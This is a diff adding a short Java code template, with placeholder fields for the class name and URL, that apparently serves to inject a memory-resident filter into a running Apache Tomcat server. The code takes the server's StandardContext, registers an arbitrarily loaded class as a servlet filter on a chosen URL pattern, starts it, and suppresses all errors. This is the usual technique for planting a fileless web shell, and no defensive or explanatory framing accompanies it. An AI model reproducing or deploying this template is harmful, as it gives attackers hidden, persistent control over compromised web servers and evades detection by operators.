@@ -1,0 +1,15 @@
+try {
+    org.apache.catalina.core.StandardContext standardContext = {{{methodNameContext}}}();
+
+    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
+    filterMap.setFilterName("{{{methodNameContext}}}");
+    filterMap.addURLPattern("{{{url}}}");
+
+    org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
+    filterDef.setFilterName("{{{methodNameContext}}}");
+    filterDef.setFilter((javax.servlet.Filter) Class.forName("{{{className}}}").newInstance());
+    standardContext.addFilterDef(filterDef);
+    standardContext.addFilterMap(filterMap);
+
+    standardContext.filterStart();
+}catch (Exception e){}
